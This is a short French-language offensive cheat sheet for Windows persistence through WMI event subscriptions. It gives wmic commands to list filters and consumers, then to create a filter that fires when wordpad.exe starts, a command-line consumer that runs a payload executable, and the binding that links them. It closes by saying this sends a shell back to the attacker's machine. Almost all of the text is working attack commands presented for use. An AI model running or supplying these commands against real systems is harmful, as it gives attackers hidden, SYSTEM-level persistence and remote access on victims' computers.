# WMI Eventing

WMI (Windows Management Instrumentation) s'executer par defaut an tant que `SYSTEM`

Querying:

```sh
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET /format:list

wmic /NAMESPACE:"\\root\subscription" PATH __EventConsumer GET /format:list

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET /format:list
```

Setup:

```sh
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="INFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="Select * From __InstanceCreationEvent Within 15 Where (TargetInstance Isa 'Win32_Process' And TargetInstance.Name = 'wordpad.exe')"
```

```sh
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="INConsumer", WorkingDirectory="C:\pers", CommandLineTemplate="C:\pers\payload.exe"
```

```sh
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"INFilter\"", Consumer="CommandLineEventConsumer.Name=\"INConsumer\""
```

Maintenant losrque le fichier `wordpad.exe` sera ouvert nous reverons un shell sur notre machine attaquante
